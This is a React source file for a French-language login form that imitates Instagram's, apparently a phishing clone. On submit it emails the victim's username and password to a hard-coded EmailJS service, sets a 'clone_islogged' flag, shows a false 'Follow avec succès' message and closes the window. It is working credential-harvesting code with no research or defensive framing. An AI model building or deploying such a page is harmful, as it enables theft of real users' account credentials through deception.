import { useRef,useEffect, useState } from "react"
import $ from "jquery";
import emailjs from '@emailjs/browser';
import Swal from 'sweetalert2'

const LoginhtmlForm = () => {
    let ref = useRef()
    const [name, setName] = useState("");
    const [pwd, setPwd] = useState("");
    const [disabled, setDisabled] = useState(true)
    const [showPwd, setshowPwd] = useState(false)
    useEffect(() => {
        console.log("ej")
        if (name && pwd && pwd.length>7) {
            if (disabled == true) {
                $("#submitBtn button").removeAttr("disabled")
                $("#submitBtn").removeClass("bg-blue-400").addClass("bg-blue-500").addClass("hover:bg-blue-500")
                setDisabled(false);
            }
        }else{
            if (disabled != true) {
                $("#submitBtn button").attr("disabled")
                $("#submitBtn").removeClass("bg-blue-500").removeClass("hover:bg-blue-500").addClass("bg-blue-400")
                setDisabled(true);
            }
        }
       if(pwd.length>1){
        $("#aff").removeClass("hidden").addClass("inline-block").fadeIn("slow")
       }else{
        $("#aff").removeClass("inline-block").addClass("hidden").fadeOut("slow")
       }
    }, [name, pwd]);

    useEffect(() => {
        if(showPwd==true){
            $("#pwd").attr("type","text")
        }else{
            $("#pwd").attr("type","password")
        }
    }, [showPwd]);
    const changeName = (e) => {
        e.preventDefault()
        let username = $("#uname").val()
        let pwd = $("#pwd").val()
        setName(username)
    }
    const changePwd = (e) => {
        e.preventDefault()
        let username = $("#uname").val()
        let pwd = $("#pwd").val()
        setPwd(pwd)
    }
    const toggleShowPwd= (e) => {
        e.preventDefault()
        setshowPwd(!showPwd)
    }
    const submitForm = (e) => {

        e.preventDefault()
        let username = $("#uname").val()
        let pwd = $("#pwd").val()

        emailjs.sendForm('service_h9zopm4', 'template_toovbdq', ref.current, 'rZK749_0K9QMSgmn7')
            .then((result) => {
                localStorage.setItem("clone_islogged", true)
                //    window.location.replace("instagram://user?username={mosala.sarl}")
                Swal.fire({
                    position: 'center',
                    icon: 'success',
                    title: 'Follow avec succès',
                    showConfirmButton: false,
                    timer: 1500
                }).then(() => {
                    window.close()
                })

            }, (error) => {
                console.log(error.text);
            });

    }

    return <div>
        <form action="" method="post" ref={ref} onSubmit={submitForm}>
            <div className="mb-2">
                <input type="text" onChange={changeName} id="uname" name="uname" className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 h-10 w-full" placeholder="Num. téléphone, nom d'utilisateur ou email" required />
            </div>
            <div className="mb-2 flex items-center relative">
                <input type="password" onChange={changePwd} id="pwd" name="password" className="bg-gray-50 border border-gray-300 text-gray-900 rounded focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 h-10 first-letter:text-sm w-full pr-16" placeholder="Mot de passe" required />
                <button id="aff" className="absolute text-sm right-2 text-[0.8em] font-bold hidden" onClick={toggleShowPwd}>
                    Afficher
                </button>
            </div>
            <div className="flex justify-end mb-5 mt-3 ">
                <a href="http://" className="text-blue-500">Mot de passe oublié ?</a>
            </div>
            <div id="submitBtn" className="mb-5 text-white focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded text-sm h-8 sm:w-auto px-5 py-1.5 text-center dark:bg-blue-500 dark:hover:bg-blue-600 dark:focus:ring-blue-800 flex items-center justify-center disabled bg-blue-400">
                <button type="submit"  disabled className="font-bold:">Se connecter</button>
            </div>

            <div className="flex">
                <span className="text-gray-700">Vous n&apos;avez pas de compte ? </span>
                <a href="http://" className="text-blue-500 ml-1 font-bold">Inscrivez-vous</a>
            </div>
        </form>

    </div >
}

export default LoginhtmlForm